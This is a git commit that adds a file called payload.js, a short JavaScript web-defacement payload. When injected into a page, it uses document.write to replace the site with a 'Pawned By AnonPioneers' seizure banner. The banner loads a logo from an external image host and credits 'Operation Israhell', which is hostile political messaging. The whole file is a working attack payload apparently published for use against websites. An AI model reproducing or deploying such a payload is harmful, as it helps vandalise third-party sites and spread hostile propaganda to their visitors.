5d1c58f67ebea5e6271fd50238c902292b25bbf5
dhjssfvutdhvdsksvh <150278251+dhjssfvutdhvdsksvh@users.noreply.github.com>
2025-05-08 19:24:20 +0300

    Create payload.js

---
+++ payload.js
@@ -0,0 +1,17 @@
+document.write(`<!DOCTYPE html>
+<html>
+<head>
+  <title>👑 Pawned By AnonPioneers 👑</title>
+  <style>
+    body{background:#000;color:#0f0;text-align:center;font-family:monospace;margin:0;padding:2em}
+    img{width:150px;margin:1em auto}
+    h1{color:#f00;font-size:2em}
+    p{font-size:1em}
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/p0GL50X/anopio.png" alt="AnonPioneers Logo">
+  <h1>⚠️ Website Seized by AnonPioneers ⚠️</h1>
+  <p>This website has been defaced as part of Operation Israhell.</p>
+</body>
+</html>`);
